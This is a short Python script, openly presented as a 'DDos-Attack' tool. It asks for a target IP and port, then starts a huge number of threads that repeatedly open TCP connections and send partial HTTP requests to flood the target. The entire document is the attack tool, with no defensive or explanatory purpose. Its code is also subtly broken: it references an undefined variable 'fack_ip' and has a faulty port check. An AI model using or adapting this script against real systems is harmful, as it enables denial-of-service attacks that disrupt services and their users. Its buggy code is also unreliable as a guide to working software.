import socket
import threading

fake_ip = "182.21.20.32"

print("""Welcome to DDos-Attack Page
Here You can have a DDos Attack Easy""")

target = input("Please enter the web targets IP :")
if(target != "") :
    print("Confirm ...")
else:
    print("Sorry there is no IP in there Try again later")
    quit()

input("Press Enter to continue ...")

print("Ok now you should write a sample por for it (443 example)")
port = int(input("Enter port name :"))
if (port == "") :
    port = 443

def attack():
    while 1 :
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /"+target+" HTTP/1.1\r\n").encode("ascii"), (target, port))
        s.sendto(("Host: "+fack_ip+"\r\n\r\n").encode("ascii"),(target, port))
        s.close()

for i in range(1000000000) :
    thread = threading.Thread(target=attack)
    thread.start()
